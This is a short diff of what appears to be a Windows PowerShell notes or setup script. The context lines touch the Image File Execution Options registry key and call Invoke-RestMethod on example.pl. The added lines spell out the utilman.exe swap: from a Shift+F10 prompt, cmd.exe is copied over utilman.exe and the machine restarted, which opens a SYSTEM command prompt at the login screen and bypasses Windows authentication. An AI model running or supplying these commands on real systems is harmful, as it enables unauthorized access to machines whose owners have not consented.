@@ -65,3 +65,6 @@ New-Item -Force "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File E
 
 #feed
 Invoke-RestMethod example.pl/example 
+
+#something 
+F10+Shift; c:; move c:\Windows\System32\utilman.exe c:\Windows\System32\utilman.exe.bak; copy c:\Windows\System32\cmd.exe c:\Windows\System32\utilman.exe; turn of, turn on
